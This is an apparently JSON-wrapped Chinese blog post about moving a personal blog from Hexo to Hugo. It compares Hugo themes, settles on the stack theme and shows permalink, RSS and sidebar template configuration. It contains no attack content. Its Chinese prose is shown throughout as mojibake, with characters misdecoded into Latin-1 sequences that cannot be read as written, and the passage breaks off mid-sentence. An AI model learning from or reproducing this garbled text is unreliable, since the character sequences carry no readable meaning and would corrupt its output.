[{"content":"ç”±äºä¹‹å‰çªå‘å¥‡æƒ³ï¼Œçœ‹åˆ°æŸäº›åŒå­¦çš„åšå®¢ç¡®å®å¥½çœ‹ï¼Œå¿ƒè¡€æ¥æ½®ä¾¿èŠ±äº†å¤§æ¦‚å‡ ä¸ªæ™šä¸ŠæŠŠåšå®¢ç”Ÿæˆå·¥å…·ä»åŸæ¥çš„ Hexo è¿ç§»åˆ°äº† Hugo ä¸Šï¼Œä¾¿æœ‰äº†è¿™æ¬¡æ¬è¿è®°å½•ï¼Œä¹Ÿç®—æ˜¯ç»™å…¶ä»–æƒ³è¿ç§»å°ä¼™ä¼´ä¸€ä¸ªå‚è€ƒã€‚\nHugo VS Hexo æ ¹æ®ä¸€äº›æ–‡ç«  [1][2]å·²ç»ç»™å‡ºçš„å¯¹æ¯”ï¼ŒHugo æ‹¥æœ‰ç€æ¯”è¾ƒä¸é”™çš„æ¸²æŸ“é€Ÿåº¦ï¼Œï¼ˆè¿™é‡Œè´´ä¸ªå®æµ‹æ¸²æŸ“æ•°æ®ï¼‰ï¼Œå¯¹äºæˆ‘è¿™ä¸ªç›®å‰æ‰€æœ‰ Posts æ¯”è¾ƒå¤šï¼Œåˆæœ‰æ¯”è¾ƒå¤šå›¾ç‰‡çš„ç”¨æˆ·æ¥è¯´ï¼Œåœ¨æ¸²æŸ“é€Ÿåº¦æ–¹é¢ç¡®å®ä¹Ÿæœ‰ä¸€å®šéœ€æ±‚ã€‚è€Œä¸”æœ€è¿‘è‡ªå·±ä¹Ÿåœ¨å­¦ä¹  Golang ï¼Œå¯¹äºä½¿ç”¨ Golang çš„å·¥å…·æˆ‘è¿˜æ˜¯æ¯”è¾ƒæœ‰å¥½æ„Ÿçš„ã€‚æˆ‘è¿›è¡Œäº†ä¸€ä¸ªå°å¯¹æ¯”ï¼Œè™½ç„¶ Hexo æ’ä»¶ç”¨çš„æœ‰äº›å¤šï¼Œä½†æ˜¯åœ¨æ»¡è¶³æˆ‘ä¸ªäººéœ€æ±‚ä¸‹ï¼Œä½¿ç”¨ä¸¤ä¸ªå·¥å…·å¯¹ç›¸åŒæ–‡ç« æ•°é‡ç”Ÿæˆé™æ€é¡µé¢çš„å¯¹æ¯”æ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n å·¦ä¸º Hexo ç”Ÿæˆé€Ÿåº¦ VS å³ä¸º Hugo ç”Ÿæˆé€Ÿåº¦ \nå½“ç„¶åœ¨ç¨å¾®ä½¿ç”¨äº†ä¸€ä¸‹åï¼Œä¹Ÿèƒ½æ„Ÿå—åˆ° Hugo çš„ç¼ºç‚¹ï¼Œç›®å‰ Hugo å¹¶ä¸æ˜¯ç‰¹åˆ«å®Œç¾ï¼Œå› ä¸ºæ²¡æœ‰ NPM é‚£ä¹ˆæ–¹ä¾¿åœ°ä½¿ç”¨æ‹“å±•ï¼Œå¾ˆå¤šéƒ½æ˜¯ä½¿ç”¨äº† Hugo è‡ªå·±æœ¬èº«æ”¯æŒçš„å†…å®¹ï¼Œæ²¡æœ‰è‰¯å¥½çš„æ‹“å±•æ€§ï¼Œæ‰€ä»¥å¯¼è‡´å¾ˆå¤šä¸œè¥¿éƒ½å¾—è‡ªå·±åŠ¨æ‰‹ï¼Œæ¯”å¦‚ä¸€äº›å°æ’ä»¶ï¼›ä½†æ˜¯å¥½åœ¨ç”±äº Hugo ç›®å‰æ¥è¯´å·²ç»æ¯”è¾ƒæˆç†Ÿï¼Œä¸éœ€è¦è‡ªå·±åŠ¨æ‰‹åšå¤ªå¤šçš„å®šåˆ¶åŒ–ä¸œè¥¿ï¼Œæ–‡æ¡£ä¹Ÿè¿˜å°šå¯ã€‚\nå†µä¸”è‡ªå·±ç›®å‰ä½¿ç”¨çš„ Hexo ä¸»é¢˜ï¼ŒåŸä½œè€…å·²ç»ä¸å†ç»§ç»­å¼€å‘äº†ï¼Œå¹¶ä¸”ä¸»é¢˜ä¹Ÿå¹¶ä¸æ˜¯å¾ˆç¬¦åˆæˆ‘çš„é¢„æœŸã€‚æ‰€ä»¥ç»¼åˆèµ·è‡ªèº«éœ€æ±‚æ¥çœ‹ï¼Œæˆ‘è¿˜æ˜¯æ›´éœ€è¦ä¸€ä¸ªæ¯”è¾ƒé«˜æ•ˆçš„æ¡†æ¶ï¼Œä¹Ÿæ­£å¥½æ¢ä¸€ä¸ªæ»¡æ„çš„ä¸»é¢˜ã€‚\nSelect A Theme è¿™é‡Œå…ˆæ•´ç†äº†ä¸€ä¸‹è‡ªå·±å¿ƒç›®ä¸­ç†æƒ³çš„ä¸»é¢˜é£æ ¼ï¼š\n ç®€æ´ã€‚  ä¸»é¡µ posts å±•ç¤ºä¸éœ€è¦é…å›¾å±•ç¤ºï¼Œå› ä¸ºæˆ‘æ¯”è¾ƒæ‡’ï¼Œæ¯æ¬¡å†™å®Œæ–‡ç« éƒ½æ‡’å¾—å»æ‰¾é…å›¾çš„äººï¼Œè€Œä¸”é…å›¾è·Ÿæ–‡ç« è¿˜è¦å¾ˆæ­é…ï¼Œè¿™æ ·ç…§èµ·æ¥æ¯”è¾ƒè´¹åŠ²ï¼Œè€Œä¸”è¿˜ä¼šå¢åŠ è‡ªå·±ä»“åº“å›¾ç‰‡æ•°é‡ï¼ˆå› ä¸ºæˆ‘æ–‡ç« ç”¨å›¾ç‰‡å¾ˆå¤šï¼‰ï¼ŒåŸºæœ¬æ²¡æœ‰å¿…è¦ã€‚ ä¸éœ€è¦å¤ªè‰³ä¸½çš„é…è‰²ï¼Œæˆ‘ä¸€å¼€å§‹ä¹Ÿå¾ˆå–œæ¬¢å„ç§ Material é£æ ¼çš„ä¸»é¢˜ï¼Œä½†æ˜¯åé¢æ’ä¸»é¢˜çš„å®åœ¨å¤ªå¤šäº†ï¼Œçœ‹ç€æˆ‘éƒ½å®¡ç¾ç–²åŠ³äº†\u0026hellip;æ‰€ä»¥æˆ‘ä¹Ÿå¼€å§‹åŒæ¶é‚£ç§èŠ±èŠ±ç»¿ç»¿ã€äº”é¢œå…­è‰²çš„ä¸»é¢˜äº†ï¼Œåé¢ä½¿ç”¨äº† Minos è¿™æ¬¾éå¸¸ç®€æ´çš„ä¸»é¢˜ï¼Œæ·±å¾—æˆ‘å¿ƒã€‚ä¸è¿‡å¯æƒœçš„æ˜¯è¯¥ä¸»é¢˜æ²¹ç”»å¹¶ä¸æ˜¯å¾ˆå¥½ï¼Œä½¿ç”¨ pagespeed å¯¹åšå®¢æµ‹é€Ÿåœ¨å³ä½¿ä¸Šäº† CDN çš„æƒ…å†µä¸‹è¯„åˆ†ååˆ†ä¸ç†æƒ³ï¼Œå†µä¸”åŸä½œè€…å·²ç»ä¸æ€ä¹ˆå¼€å‘è¿™ä¸ªä¸»é¢˜äº†ï¼Œè‡ªå·±ä¹Ÿæ²¡æœ‰å¾ˆå¤šç²¾åŠ›æ¥ä¼˜åŒ–è¿™ä¸ªä¸»é¢˜ï¼Œå°è¯•äº†å¤šæ¬¡ä¼˜åŒ–åªèƒ½è¯´æ”¶æ•ˆç”šå¾®ï¼Œè¿™ä¹Ÿæ˜¯ä¿ƒä½¿æˆ‘æ›´æ¢æ¶æ„çš„åŸå› ä¹‹ä¸€ã€‚   å¤§æ–¹ã€‚å› ä¸ºæˆ‘ä¸éœ€è¦å…¶ä»–ä¸ƒä¸ƒå…«å…«çš„ä¸œè¥¿ï¼Œç«Ÿå¯èƒ½å±•ç¤ºé¡µé¢å†…å®¹å°±è¡Œï¼Œæ‰€ä»¥æˆ‘è§‰å¾—å†…å®¹å±•ç¤ºéœ€è¦å°½é‡å®½å±ï¼Œä¸è¦å¼„çš„çª„çª„çš„ï¼Œå°¤å…¶æ˜¯ PC ç«¯ï¼Œæœ‰äº›ä¸»é¢˜æˆ‘æ˜¯å¾ˆä¸æ˜ç™½ PC ç«¯æ˜¾ç¤ºå†…å®¹å®½åº¦åªå äº†æ•´ä¸ªå±å¹•çš„ 20-30% ï¼Œå…¶ä»–ä¹Ÿæ²¡æœ‰åˆ©ç”¨ï¼Œä¸çŸ¥é“è¿™ä¹ˆè®¾è®¡æ˜¯ä¸ºäº†å•¥ï¼Œæ¯”è¾ƒæ‡’å»é€‚é…å“åº”å¼è®¾è®¡ï¼Ÿ ä¾§è¾¹ç›®å½•ã€‚è¿™ä¸ªåŠŸèƒ½åœ¨ 2021 å¹´æˆ‘è§‰å¾—æ˜¯éå¸¸å¿…è¦çš„ï¼Œå¹¶ä¸”æˆ‘åšå®¢æœ‰å¥½å‡ ç¯‡éå¸¸é•¿çš„æ–‡ç« ï¼Œæ²¡æœ‰ä¾§è¾¹ç›®å½•ï¼Œé˜…è¯»èµ·æ¥ç®€ç›´å—ç½ªï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“åœ¨è¿™æ—¶ä»£ä¾§è¾¹ç›®å½•ç«Ÿç„¶è¿˜ä¸æ˜¯ç°åœ¨åšå®¢çš„æ ‡é…ã€‚ä¹‹å‰ä¼˜åŒ– Minos ä¸»é¢˜æ—¶æƒ³ç»™ä»–åŠ ä¸ªä¾§è¾¹æ æ¥ç€ï¼Œä½†æ˜¯å¥ˆä½•ç¡®å®å¤ªèœäº†ï¼Œä¹Ÿæ²¡å•¥ç²¾åŠ›ï¼Œåªèƒ½åšåˆ°åœ¨æ–‡ç« å¼€å¤´åŠ å…¥ç›®å½•ã€‚ åŠŸèƒ½æ€§å®ç”¨ã€‚è¿™é‡Œçš„åŠŸèƒ½æ€§æŒ‡çš„æ˜¯å¯ä»¥æ”¯æŒå„ç§çš„å°æ’ä»¶ï¼Œæ¯”å¦‚ï¼šåµŒå…¥å¼æ¨æ–‡ï¼Œè¿™æ ·å°±æ˜¾å¾—å¾ˆ Modern äº†ï¼›é¢œè‰²ä¸ä¸€æ ·çš„æ³¨é‡Šæ ·å¼ï¼Œè¿™æ ·å¯ä»¥åœ¨æ–‡ç« ä¸­ä½¿ç”¨è¿™äº›ä¸åŒé¢œè‰²çš„æ³¨é‡Šæ ·å¼æ¥è¾¾åˆ°ä¸åŒçš„æç¤ºæ•ˆæœã€‚  æˆ‘åœ¨ Github ä¸ŠæŸ¥è¯¢ Hugo Theme è¯é¢˜ï¼Œæ‰¾äº†ä¸€äº›æœ€è¿‘ä¸€å¹´å†…æœ‰æ´»åŠ¨çš„ Repo è¿›è¡Œç­›é€‰ï¼Œä¹Ÿæœ‰ä¸€äº›æ˜¯ç›´æ¥ä» Hugo å®˜ç½‘çš„ä¸»é¢˜é¡µé¢æ‰¾çš„ï¼š\n  https://github.com/varkai/hugo-theme-zozo\néå¸¸ç®€æ´ï¼Œç•Œé¢æ¯”è¾ƒå–œæ¬¢ï¼Œä½†æ˜¯æ²¡æœ‰ä¾§è¾¹ç›®å½•ï¼ŒåŠŸèƒ½æ€§è¾ƒå·®ï¼Œæˆ‘è§‰å¾—æ¯”è¾ƒé€‚åˆä¸­æ–‡ç«™ç‚¹ã€‚PASS\n  https://github.com/wayjam/hugo-theme-fluency ç•Œé¢æ¯”è¾ƒä¸€èˆ¬ï¼ŒåŠŸèƒ½æ€§æ²¡æ€ä¹ˆä»‹ç»ï¼Œçœ‹èµ·æ¥ä¹Ÿæ¯”è¾ƒå·®ã€‚PASS\n  https://github.com/ThemeTony/hugo-theme-tony å‹‰å¼ºè¿‡å¾—å»ï¼Œä½†æ˜¯ä¸­é—´å†…å®¹ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¦æ”¾é‚£ä¹ˆçª„ï¼ŒåŠŸèƒ½æ€§ä¸€èˆ¬ã€‚PASS\n  https://github.com/ahonn/hexo-theme-even åŠŸèƒ½æ€§ä¸€èˆ¬ï¼Œé…è‰²æœ‰ç‚¹å‘†æ¿ã€‚PASS\n  https://github.com/nanxiaobei/hugo-paper è®¾è®¡æ¯”è¾ƒå–œæ¬¢ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆ PC ç«¯å†…å®¹å®½åº¦è¿˜è¿™ä¹ˆçª„ï¼ŒåŠŸèƒ½æ€§ç•¥å·®ã€‚PASS\n  https://github.com/reuixiy/hugo-theme-meme åˆæ˜¯ä¸€ä¸ª PC ç«¯å†…å®¹å®½åº¦æçª„çš„ä¸»é¢˜ï¼Œä¸æ˜¯å¾ˆæ‡‚ä¸ºå•¥ã€‚PASS\n  https://github.com/nodejh/hugo-theme-mini ç®€çº¦ï¼Œåªèƒ½è¯´è¿‡äºç®€çº¦äº†ï¼Œç›®å½•ä¹Ÿæ²¡æœ‰ã€‚PASS\n  https://github.com/wangchucheng/hugo-eureka ç•Œé¢ç¾è§‚ï¼ŒåŠŸèƒ½æ€§è¿˜è¡Œï¼Œåœ¨è€ƒè™‘èŒƒå›´ä¹‹å†…ã€‚\n  https://github.com/CaiJimmy/hugo-theme-stack è€ƒè™‘ä¹‹ä¸€\n  è¿˜æœ‰å‡ ä¸ªåŒä¸€äº›åˆ—çœ‹èµ·æ¥æŒºæ£’çš„ä¸»é¢˜ï¼Œä½†æ˜¯ç”±äºæŸäº›åŸå› æœ€ç»ˆæ²¡æœ‰é€‰ç”¨ï¼š\n  https://github.com/dillonzq/LoveIt æ¯”è¾ƒå–œæ¬¢çš„ä¸»é¢˜ä¹‹ä¸€ï¼Œä½†æ˜¯ç›®å‰çœ‹èµ·æ¥ä½œè€…ä¸ç»§ç»­ç»´æŠ¤äº†ï¼Œæ¯”è¾ƒå¯æƒœã€‚å½“æ—¶ä¹Ÿæ˜¯çœ‹åˆ°åˆ«äººä¸»é¢˜ç”¨è¿™ä¸ªæ¯”è¾ƒæ¼‚äº®ï¼Œä¹Ÿæ‰æœ‰æƒ³å…¥å‘ Hugo çš„æƒ³æ³•\n  https://github.com/khusika/FeelIt ä» LoveIt è¡ç”Ÿå‡ºæ¥çš„ä¸»é¢˜ä¹‹ä¸€ï¼ŒDemo Site çœ‹è¿‡å»æˆ‘å¹¶ä¸å–œæ¬¢ä¸»é¡µçš„å¡ç‰‡è®¾è®¡ï¼Œæ¯”è¾ƒå–œæ¬¢åŸæ¥ LoveIt çš„ä¸»é¡µæ ·å¼ã€‚å®½å±çš„æ ·å¼æ”¹çš„ä¹Ÿå¾ˆå¥½ï¼Œä½†æ˜¯å°±æ˜¯ä¸»é¡µè¿™ä¸ªã€‚ã€‚å› ä¸ºæˆ‘çš„æ–‡ç« ç¼©ç•¥å¯èƒ½éƒ½æ¯”è¾ƒé•¿è€Œä¸”ä¸å–œæ¬¢æ”¾ä¸»é¡µå›¾ï¼Œå°±ä¼šå¾ˆä¸‘ï¼ŒPASS\n  https://themes.gohugo.io/themes/ublogger/ ä¹Ÿæ˜¯ä» LoveIt è¡ç”Ÿå‡ºæ¥çš„ä¸»é¢˜ä¹‹ä¸€ï¼Œä¸»é¡µåŒæ ·æ˜¯å¡ç‰‡è®¾è®¡ï¼Œè·Ÿ FeelIt ä¸€æ ·æ‰¾äº†ä¸€ä¸‹é…ç½®ï¼Œä½†æ˜¯çœ‹èµ·æ¥æ²¡åŠæ³•é…ç½®ä¸»é¡µçš„æ˜¾ç¤ºæ ·å¼ï¼ŒPASS\n  æœ€ç»ˆåœ¨ eureka è·Ÿ stack ä¸­è¿›è¡Œæœ€ç»ˆé€‰æ‹©ï¼š\n eureka æ•´ä½“æ¯”è¾ƒç¬¦åˆæˆ‘çš„é¢„æœŸï¼Œä½†æ˜¯ç”¨çš„äººä¹Ÿç¡®å®è´¼å¤šï¼Œéšä¾¿æ‰“å¼€å‡ ä¸ª hugo çš„ç½‘ç«™ï¼Œä¸å°‘äººç”¨çš„éƒ½æ˜¯ eurekaï¼Œæ‹¿ eureka çš„ Demo Stie åœ¨ pagespeed æµ‹è¯•ï¼Œåªæœ‰ 32 åˆ† stack çœ‹èµ·æ¥å¹¶æ²¡æœ‰ eureka é‚£ä¹ˆå¥½ï¼Œä¸»è¦æ˜¯å¯¹äºæˆ‘æ¥è¯´ä¸»é¡µè®¾ç½®è¿˜æ˜¯æœ‰ç‚¹å¤ªæ‹¥æŒ¤äº†ï¼Œä¸å¤Ÿè½è½å¤§æ–¹ï¼Œä¹Ÿæ²¡æœ‰æ”¯æŒå¤šå½©çš„æ³¨é‡Šï¼Œçœ‹èµ·æ¥æ¯”è¾ƒçš„ä¸€èˆ¬ï¼Œä½†æ˜¯å…¶ Demo Site ç›¸å¯¹äº eureka çš„ Demo Site æ¥è¯´ï¼Œpagespeed å¾—åˆ†å¯ä»¥æ‹¿åˆ°è¿‘ä¹æ»¡åˆ†çš„æˆç»©ï¼Œä¼˜åŒ–ç›¸å½“ä¸é”™ã€‚  æ‰€ä»¥ï¼Œåœ¨ç»¼åˆè€ƒè™‘äº†ä¸¤è€…çš„ä¼˜åŠ£å¯¹æ¯”ä¹‹åï¼Œæˆ‘æœ€ç»ˆé€‰æ‹©äº† stack ï¼Œå°½ç®¡å…¶åŠŸèƒ½æ€§å¹¶ä¸æ˜¯ç‰¹åˆ«å®Œç¾ï¼Œä½†æ˜¯æˆ‘è§‰å¾—ä¼˜åŒ–æ˜¯ä¸€ä»¶æ¯”è¾ƒå¤æ‚çš„äº‹ï¼Œä»å„è‡ªçš„ Demo Site æ¥çœ‹ï¼Œstack çš„ä¼˜åŒ–æ•ˆæœè¦è¿œè¿œç”±äº eureka çš„ï¼Œå°½ç®¡ stack åŠŸèƒ½æ€§ä¸Šæ¯” eureka ç¨å¼±ä¸€äº›ï¼Œä½†æ˜¯æˆ‘å¯ä»¥åœ¨å…¶åŸºç¡€ä¸Šå»å¢åŠ ã€ä¿®æ”¹åŠŸèƒ½ï¼Œè€Œä¸éœ€è¦åœ¨å¯¹ä¸»é¢˜è¿›è¡Œæ•´ä½“ä¼˜åŒ–äº†ï¼Œè¿™æ˜¯æœ€ä¸»è¦çš„ä¸€ç‚¹ã€‚\nConfiguration é¦–å…ˆè‚¯å®šæ˜¯å¾—å…ˆå‚è€ƒ stack ä¸»é¢˜æ–‡æ¡£ï¼Œè·Ÿç€æ–‡æ¡£ï¼ŒæŠŠè¯¥é…ç½®çš„é…ç½®å¥½äº†ï¼Œè¯¥å¤åˆ¶çš„å¤åˆ¶å¥½äº†ï¼Œå†è¿›ä¸€æ­¥è¿›è¡Œä¿®æ”¹å…¶ä»–çš„æ“ä½œã€‚\nURL Path å¯¹äºä¸ªäººåšå®¢çš„è¿ç§»è€Œè¨€ï¼Œä¿è¯æ–‡ç« é“¾æ¥ä¸å˜æ˜¯æœ€é‡è¦çš„ã€‚\nå› ä¸ºå¯¹äºä¸€èˆ¬ç«™é•¿è‡ªå»ºçš„ç«™ç‚¹æ¥è¯´ï¼Œå¦‚æœä¸€äº›æ–‡ç« è¢«å…¶ä»–ç«™ç‚¹å¼•ç”¨äº†ï¼Œé‚£ä¹ˆè‚¯å®šå°±æ˜¯é™æ€é“¾æ¥äº†ï¼Œå¦‚æœè¿ç§»åæ”¹å˜äº†åŸæ–‡çš„ URL é“¾æ¥åœ°å€ï¼Œä¼šå¯¹åŸæ¥å…¶ä»–ç«™ç‚¹çš„å¯¼å‘éå¸¸ä¸å‹å¥½ï¼Œæ‰€ä»¥æˆ‘ä»¬åŸºæœ¬å¾—è¦ç¡®ä¿æ—§æ–‡ç« é“¾æ¥æœ€å¥½ä¸è¦è¿›è¡Œæ”¹åŠ¨ã€‚\nè¿™é‡Œä¸»è¦å‚è€ƒè¯¥æ–‡ç« [2]çš„è¿ç§»ä¿®æ”¹éƒ¨åˆ†ï¼Œæˆ‘ä¹‹å‰ Hexo çš„ç«™ç‚¹é“¾æ¥ä¸ºï¼š/:year/:month/:day/:filename/ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿè¦åœ¨ Hugo è¿™é‡Œå°†ç”Ÿæˆçš„é¡µé¢é“¾æ¥æ”¹æˆè¿™ç§æ ·å­ï¼Œæˆ‘ä»¬éœ€è¦åœ¨é…ç½®æ–‡ä»¶ä¸­å¢åŠ å¦‚ä¸‹é…ç½®ï¼š\npermalinks:posts:/:year/:month/:day/:filename/æˆ‘è¿™é‡Œé€‰ç”¨äº† yaml æ ¼å¼ï¼Œ toml æ ¼å¼çš„åŒå­¦å¯ä»¥æ ¹æ®ä»¥ä¸Šè‡ªè¡Œä¿®æ”¹ã€‚\nRSS é»˜è®¤ Hugo ç”Ÿæˆçš„ RSS é“¾æ¥ä¸º /index.xml ï¼Œè€Œæˆ‘ä¹‹å‰ç”¨çš„æ˜¯ atom.xmlï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹é…ç½®ä¿®æ”¹ï¼š\noutputFormats:RSS:mediatype:\u0026#34;application/rss\u0026#34;baseName:\u0026#34;atom\u0026#34;å¹¶ä¸éœ€è¦ä¿®æ”¹ä¸»é¢˜æ–‡ä»¶å¤¹ä¸‹çš„ rss.xml ï¼ŒHugo ä¼šè‡ªåŠ¨æ ¹æ®æˆ‘ä»¬çš„é…ç½®åœ¨ç«™ç‚¹ç›®å½•ä¸‹ç”Ÿæˆ atom.xml ã€‚å¹¶ä¸”ï¼Œåœ¨ stack ä¸»é¢˜ä¸‹æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡åœ¨ä¸»é¢˜é…ç½®æ–‡ä»¶ä¸­é…ç½®rssFullContenté€‰é¡¹æ¥å†³å®šæ˜¯å¦åœ¨ rss æ–‡ä»¶ä¸­è¾“å‡ºå…¨æ–‡ï¼Œåƒæˆ‘çš„æ–‡ç« ä¼šæ¯”è¾ƒé•¿å°±ä½¿ç”¨äº†falseè¡¨ç¤ºä¸è¾“å‡ºå…¨æ–‡ã€‚\nTags é“¾æ¥  â€‹\tHugo ä¸­é»˜è®¤ä¼šæŠŠé“¾æ¥ä¸­çš„å­—æ¯å˜æˆå°å†™ï¼Œæ¯”å¦‚æ ‡ç­¾ Go ï¼Œåœ¨ä¹‹å‰å¯¹åº”åœ°å€ /tags/Go ï¼Œæ¢æˆ Hugo ååˆ™æ˜¯ /tags/go ï¼Œå¯ä»¥é€šè¿‡ä¸‹é¢çš„é…ç½®å…³é—­è¿™ä¸ªè½¬åŒ–ã€‚\n å…¶å®æˆ‘è®¤ä¸ºè¿™ä¸ªä¿ç•™é€‰é¡¹å¹¶ä¸é‡è¦ï¼Œæ‰€ä»¥æˆ‘å¹¶æ²¡æœ‰ç‰¹åˆ«ä¿®æ”¹è¿™ä¸ªé€‰é¡¹ï¼Œä¿æŒäº†åŸæ ·ï¼Œå¦‚æœæœ‰åŒå­¦å»ºè®®ï¼Œå¯ä»¥å‚è€ƒä¸Šè¿°æ–‡ç« [2]\nEdit The Theme æ¥ä¸‹é‡Œå°±æ˜¯ä¼˜åŒ–ä¸»é¢˜æ—¶é—´äº†ï¼Œå¯¹æ¯”åŸä¸»é¢˜ï¼Œæˆ‘åœ¨å…¶åŸºç¡€ä¸Šåšäº†ä¸€å®šçš„ä¿®æ”¹ï¼Œä¸»è¦æœ‰å¦‚ä¸‹å‡ ä¸ªç‚¹ã€‚ï¼ˆå› ä¸ºæˆ‘å¯¹ Hugo ä¸»é¢˜å¼€å‘å¹¶ä¸æ˜¯å¾ˆç†Ÿï¼ŒåŸºæœ¬å°±æ˜¯å¯¹ç€æ–‡æ¡£æ”¹ï¼Œä»¥åŠåŒ…æ‹¬å¯¹ç€å…¶ä»–æœ‰æˆ‘éœ€è¦çš„ç‰¹æ€§çš„ä¸»é¢˜ä»£ç å‚è€ƒæ¥è¿›è¡Œä¿®æ”¹çš„ï¼Œæ‰€ä»¥ä»£ç å¯èƒ½æ”¹çš„æ¯”è¾ƒåƒåœ¾ï¼‰\nSidebar å»é™¤äº†é¦–é¡µå·¦ä¾§ Sidebar çš„ç½‘ç«™æè¿°ï¼Œæ”¹æˆäº†ç¤¾äº¤é“¾æ¥ã€‚\nå›¾æ ‡ä½¿ç”¨çš„æ˜¯ä¸»é¢˜é…å¥—çš„ Tabler Icons ï¼Œè¿˜æ˜¯æ¯”è¾ƒå¥½ç”¨çš„ï¼ŒæŠŠä½ æƒ³è¦çš„ svg æ”¾åˆ° assets/icons ç›®å½•ä¸‹ã€‚æ¥ç€ä¸ºäº†ä¿æŒä¸ä¸»é¢˜æ•´ä½“è‰²è°ƒä¸€è‡´ï¼Œéœ€è¦ä¿®æ”¹è¿™ä¸ª svg æ–‡ä»¶ä¸­çš„strokeå±æ€§ï¼Œæ”¹æˆstroke=\u0026quot;currentColor\u0026quot;ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨å…¶ä»–åœ°æ–¹å¼•ç”¨åˆ°è¿™ä¸ªå›¾æ ‡äº†ã€‚\næ¥ç€ç›´æ¥æœsite-descriptionï¼Œåœ¨ themes/stack/layouts/partials/sidebar/left.html å®šä½åˆ°ä¾§è¾¹æ çš„ä»£ç ï¼Œåˆ æ‰åŸæ¥çš„ä»£ç ï¼Œå°†å…¶ä¿®æ”¹ä¸ºä»¥ä¸‹ä»£ç ï¼š\n\u0026lt;div class=\u0026#34;site-description\u0026#34;\u0026gt; {{ if (.Site.Params.social.github) }} \u0026lt;a title=\u0026#34;GitHub\u0026#34; href=\u0026#34;{{.Site.Params.social.github}}\u0026#34; target=\u0026#34;_blank\u0026#34; rel=\u0026#34;noopener\u0026#34;\u0026gt; {{ partial \u0026#34;helper/icon\u0026#34; \u0026#34;github\u0026#34; }} \u0026lt;/a\u0026gt; {{ end }} {{ if (.Site.Params.social.twitter) }} \u0026lt;a title=\u0026#34;Twitter\u0026#34; href=\u0026#34;{{.Site.Params.social.twitter}}\u0026#34; target=\u0026#34;_blank\u0026#34; rel=\u0026#34;noopener\u0026#34;\u0026gt; {{ partial \u0026#34;helper/icon\u0026#34; \u0026#34;twitter\u0026#34; }} \u0026lt;/a\u0026gt; {{ end }} {{ if (.Site.Params.social.rss) }} \u0026lt;a title=\u0026#34;RSS\u0026#34; href=\u0026#34;{{.Site.Params.social.rss}}\u0026#34; target=\u0026#34;_blank\u0026#34; rel=\u0026#34;noopener\u0026#34;\u0026gt; {{ partial \u0026#34;helper/icon\u0026#34; \u0026#34;rss\u0026#34; }} \u0026lt;/a\u0026gt; {{ end }} \u0026lt;/div\u0026gt; ç¨å¾®è§£é‡Šä¸€ä¸‹ï¼Œ.Site.Paramså¯ä»¥è·å–åˆ°ä¸»é¢˜é…ç½®æ–‡ä»¶ä¸­çš„paramsé…ç½®é€‰é¡¹ï¼Œåé¢å¯¹åº”çš„å°±æ˜¯ç›¸åº”çš„å±‚çº§å…³ç³»äº†ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨é…ç½®æ–‡ä»¶ä¸­å¢åŠ å¦‚ä¸‹é€‰é¡¹ï¼š\nparams:#...social:github:https://github.com/ZeddYutwitter:https://twitter.com/ZeddYu_Lurss:https://blog.zeddyu.info/atom.xmlè€Œ{{ partial \u0026quot;helper/icon\u0026quot; \u0026quot;rss\u0026quot; }}å°±å¯ä»¥å¸®åŠ©æˆ‘ä»¬å»è·å–ä¸Šè¿°æ·»åŠ çš„ svg æ–‡ä»¶ä½œä¸ºæˆ‘ä»¬çš„å›¾æ ‡ï¼Œæ¯”å¦‚è¿™é‡Œå¯¹åº”çš„å°±æ˜¯ assets/icons/rss.svg æ–‡ä»¶ã€‚\nè¿™é‡Œæˆ‘åªå¢åŠ äº†ä¸‰ä¸ªè‡ªå·±å¸¸ç”¨çš„ç¤¾äº¤é“¾æ¥ï¼Œå¦‚æœæƒ³è¦å¢åŠ å…¶ä»–é“¾æ¥ï¼Œéƒ½æ˜¯ç±»ä¼¼çš„æ“ä½œï¼›è¿™é‡Œæœ€ä¼˜è§£å½“ç„¶æ˜¯é€šè¿‡å¾ªç¯è¯»å– social é…ç½®ï¼Œç„¶åè‡ªåŠ¨é…ç½®ï¼Œä½†æ˜¯è‡ªå·±æ¯”è¾ƒæ‡’ï¼Œä¹Ÿæ²¡ä»€ä¹ˆå…¶ä»–è¦æ·»åŠ çš„ï¼Œå°±é™æ€å†™äº†ä¸‰ä¸ªè‡ªå·±å¸¸ç”¨çš„ç¤¾äº¤é“¾æ¥ã€‚\nSummary Of Articles åŸä¸»é¢˜åœ¨å±•ç¤ºä¸»é¡µæ–‡ç« çš„æ—¶å€™ï¼Œå¯¹äºæ–‡ç« å†…å®¹çš„è·å–å¹¶éæ˜¯è¯»å–æ‘˜è¦ï¼Œè¿™é‡Œçš„æ‘˜è¦å°±æ˜¯è¯»å–æ–‡ç« å¼€å¤´è‡³\u0026lt;!--more--\u0026gt;ä¹‹é—´çš„å†…å®¹ï¼Œè€Œæ˜¯è¯»å–æ–‡ç« çš„ description å­—æ®µï¼Œè€Œå¯¹äºæˆ‘æ¥è¯´ï¼Œæˆ‘æ›´å–œæ¬¢ä½¿ç”¨æ‘˜è¦çš„å½¢å¼ï¼Œå¹¶ä¸”è‡ªå·±çš„æ–‡ç« ä¹‹å‰ä¹Ÿæ²¡æœ‰å†™è¿‡ description å­—æ®µï¼Œç»™æ¯ç¯‡æ–‡ç« å¢åŠ è¯¥å­—æ®µä¼šå¾ˆéº»çƒ¦ã€‚\næ‰€ä»¥æˆ‘ä¿®æ”¹äº†åŸä¸»é¢˜ä¸»é¡µå±•ç¤ºæ–‡ç« å†…å®¹çš„å½¢å¼ï¼Œæ”¹æˆäº†æ˜¾ç¤ºæ‘˜è¦çš„å½¢å¼ã€‚é€šè¿‡å®šä½article-subtitleæ‰¾åˆ°å¯¹åº”æ–‡ä»¶ themes/stack/layouts/partials/article/components/details.html ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯å¾ˆå¥½æ”¹ï¼Œå› ä¸ºè¿™ä¸ªæ–‡ä»¶è¢«ä¸»é¡µé¡µé¢æ‰€ä½¿ç”¨ï¼Œä¹Ÿè¢«æ–‡ç« 